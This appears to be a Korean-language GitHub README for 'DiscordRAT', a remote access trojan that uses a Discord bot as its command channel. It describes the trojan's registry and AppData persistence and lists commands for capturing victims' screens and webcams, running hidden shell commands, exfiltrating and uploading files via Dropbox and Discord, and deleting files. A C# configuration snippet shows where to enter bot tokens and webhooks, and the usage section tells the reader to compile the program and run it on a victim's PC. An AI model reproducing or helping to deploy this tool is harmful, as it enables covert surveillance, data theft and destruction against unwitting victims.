![venom](https://capsule-render.vercel.app/api?type=venom&height=200&text=DiscordRAT&fontSize=70&color=0:8871e5,100:b678c4&stroke=b678c4)

Discord.NET 을 이용한 reverse shell
## How It Works
프로그램을 실행할시 [init](https://github.com/root1234567891234/Discrod_Rat/blob/master/AntiMalware/class/init.cs) 실행(레지스트리 등록 appdata에 악성코드 복사본 등록(injection))
이미 악성코드가 실행중이면 중단하고 아니라면 봇 작동 후
명령어가 들어올시 [Command.command()](https://github.com/root1234567891234/Discrod_Rat/blob/master/AntiMalware/class/search.cs) 실행

public 명령어입니다.
```
all                                           모든 피해자 목록 조회
all_screenshot                                모든 피해자 화면 가져오기
all_camshot                                   모든 피해자 캠 가져오기
all_shell                                     모든 피해자에게 shell 명령어 실행
```
private 명령어입니다.
```
(피해자의 아이피) kill                          Discrod_RAT을 종료시킴
(피해자의 아이피) delet                         모든 Discrod_RAT을 삭제
(피해자의 아이피) screenshot                    피해자의 화면을 가져옵니다.
(피해자의 아이피) camshot                       피해자의 캠을 가져옵니다.
(피해자의 아이피) open (파일경로)                피해자 컴퓨터 내부에있는 특정 파일을 엽니다. (shellexecute 사용)
(피해자의 아이피) messagebox (띄울 메시지)       피해자 컴퓨터에 메시지 박스를 띄웁니다.
(피해자의 아이피) messagebox_que (띄울 메시지)   피해자 컴퓨터에 메시지 박스를 띄웁니다.(Question 사용)
(피해자의 아이피) messagebox_error (띄울 메시지) 피해자 컴퓨터에 메시지 박스를 띄웁니다.(Error 사용)
(피해자의 아이피) dropbox_download (파일경로)    dropbox api를 사용해 피해자 컴퓨터의 내부파일을 가져옵니다.(무료버전 사용시 최대 2GB크기 까지 가능)
(피해자의 아이피) dropbox_upload (파일경로)      dropbox api를 사용해 피해자 컴퓨터에 파일을 업로드 시킵니다.(무료버전 사용시 최대 2GB크기 까지 가능)
(피해자의 아이피) deletdir (폴더경로)            디렉토리를 삭제합니다. (하위목록까지 전부삭제)
(피해자의 아이피) deletfile (파일경로)           파일을 삭제합니다.
(피해자의 아이피) dir (폴더경로)                 디렉토리 내부의 파일목록을 조회합니다. cmd의 dir과 똑같음
(피해자의 아이피) shell (실행할 명령어)          피해자 컴퓨터에서 shell을 사용(콘솔창은 안뜸)
(피해자의 아이피) downloadfile (파일경로)        discord attachments를 사용해서 파일 다운로드(최대 25MB까지 다운가능 니트로 사용시 더 큰파일도 가능)
(피해자의 아이피) uploadfile (파일경로)          discord attachments를 사용해서 피해컴퓨터에 특정 파일 다운(최대 25MB까지 다운가능 니트로 사용시 더 큰파일도 가능)
```
## Usage
[필수값](https://github.com/root1234567891234/Discrod_Rat/blob/master/AntiMalware/class/value.cs)을 수정해 봇,후크와 연동한후 컴파일 그리고 피해자PC에서 실행시키세요
```C# 8
private static GET GET = new GET();
// 본 프로그램의 이름
public string filename = "";
// 실제 게임의 위치
public string path = "";
// 프로그램 버전
public string version = " | 2.23v";
// 디스코드 봇 토큰
public string bot_token = "";
// 웹훅링크
public string EndPoint =
@"";
// ip
public string ip = GET.ip();
// 드랍박스 연결
public DropboxClient dropbox_ = new DropboxClient(
                                      oauth2RefreshToken: "",
                                      appKey: "",
                                      appSecret: "");
// 웹에 post를 보내기위한 HttpClient선언
public HttpClient client_ = new HttpClient();
```
